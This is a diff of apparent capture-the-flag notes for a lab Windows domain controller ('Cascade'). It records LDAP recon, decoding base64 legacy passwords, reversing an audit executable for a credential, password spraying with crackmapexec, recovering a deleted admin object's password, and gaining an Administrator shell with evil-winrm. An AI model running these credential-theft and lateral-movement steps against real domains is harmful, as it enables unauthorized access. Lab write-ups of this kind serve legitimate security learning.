@@ -1,9 +1,4 @@
-Port 5985/tcp is open so we could try connecting with EvilWinRm
-
-TODO: Perform a nslookup to look for the host name
-
-
-[Recon]
+[===== Recon =====]
 
 * Looking for the domain name with a ldapsearch
 -- ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" -s base namingcontexts --
@@ -27,7 +22,7 @@ cascadeLegacyPwd: "clk0bjVldmE=" for user "r.thompson"
 base64 decoding clk0bjVldmE= gives us "rY4n5eva"
 
 
-* Using smbmap with empty passwords and users retunrs nothing *
+* Using smbmap with empty passwords and users returns nothing *
 smbmap -H 10.10.10.182 -d cascade.local -u '' -p ''
 
 
@@ -95,6 +90,8 @@ and as we see in a ArkAdRecycleBin.log file user ArkSvc indeed deleted him, mayb
 gets us something *
 
 
+[===== Exploits =====]
+
 * Using a metasploit i was able to decrypt the VNC password (followed this link https://github.com/frizb/PasswordDecrypts) *
 
 [Result: $> msfconsole
@@ -115,3 +112,36 @@ msf5 > irb
 * Using the new user s.smith i can see in the Audit$ share, which has CascAutit.exe,
 running the exe will give me a password i need *
 
+
+* Downloading the entire Audit$ share and RE the CascAutid.exe with a tool called dnSpy i got password "w3lc0meFr31nd" *
+
+crackmapexec smb 10.10.10.182 -u users -p 'w3lc0meFr31nd' -d cascade.local
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:w3lc0meFr31nd STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CASC-DC1$:w3lc0meFr31nd STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 
+
+
+* Trying to get the password from that deleted TempAdmin *
+
+Get-ADObject -Filter 'isDeleted -eq $True -and name -ne "Deleted Objects"' -IncludeDeletedObjects -Properties *
+...
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+...
+
+Decoding the cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz => baCT3r1aN00dles
+
+* Looking back at the first email we discovered, we know that all administrator accounts use the same password *
+
+* Pwned *
+evil-winrm -i 10.10.10.182 -u Administrator -p 'baCT3r1aN00dles'
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cascade\administrator
